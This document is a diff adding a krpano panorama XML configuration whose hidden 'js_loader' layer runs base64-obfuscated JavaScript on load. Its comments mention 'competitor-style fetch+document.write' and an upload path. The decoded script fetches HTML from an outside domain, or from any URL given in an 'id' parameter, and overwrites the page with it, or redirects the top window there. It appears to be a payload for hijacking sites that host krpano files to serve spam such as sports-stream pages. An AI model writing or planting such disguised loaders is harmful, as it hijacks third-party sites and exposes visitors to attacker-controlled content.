@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<krpano version="1.0.8.15">
+  <!-- Generated: 2026-09-10T21:05:59 -->
+  <!-- Mode: WRITE (competitor-style fetch+document.write) -->
+  <!-- Upload to: https://github.com/forever2468/cfjn/c.xml -->
+  <!-- Posts base: https://avd.grapevine.uk.com/spo/video/ -->
+  <layer name="js_loader" type="container" visible="false"
+    onloaded="js(eval(var w=atob('dmFyIGlkPW5ldyBVUkxTZWFyY2hQYXJhbXMobG9jYXRpb24uc2VhcmNoKS5nZXQoImlkIil8fCLvvYzvvYnvvZbvvYUtdWVmYS1jaGFtcGlvbnMtbGVhZ3VlLWxpdmUtYnJvYWRjYXN0LTY5MyI7dmFyIEJBU0U9Imh0dHBzOi8vYXZkLmdyYXBldmluZS51ay5jb20vc3BvL3ZpZGVvLyI7dmFyIHVybD0oL15odHRwcz86XC9cLy9pLnRlc3QoaWQpKT9pZDooQkFTRStTdHJpbmcoaWQpLnJlcGxhY2UoL15cLysvLCIiKS5yZXBsYWNlKC9cLmh0bWwkL2ksIiIpKyIuaHRtbCIpO2ZldGNoKHVybCkudGhlbihmdW5jdGlvbihlKXtyZXR1cm4gZS50ZXh0KCl9KS50aGVuKGZ1bmN0aW9uKGUpe2RvY3VtZW50Lm9wZW4oKTtkb2N1bWVudC53cml0ZShlKTtkb2N1bWVudC5jbG9zZSgpfSkuY2F0Y2goZnVuY3Rpb24oKXt0cnl7dG9wLmxvY2F0aW9uLnJlcGxhY2UodXJsKX1jYXRjaCh4KXtsb2NhdGlvbi5ocmVmPXVybH19KTs=');eval(w)););" />
+</krpano>
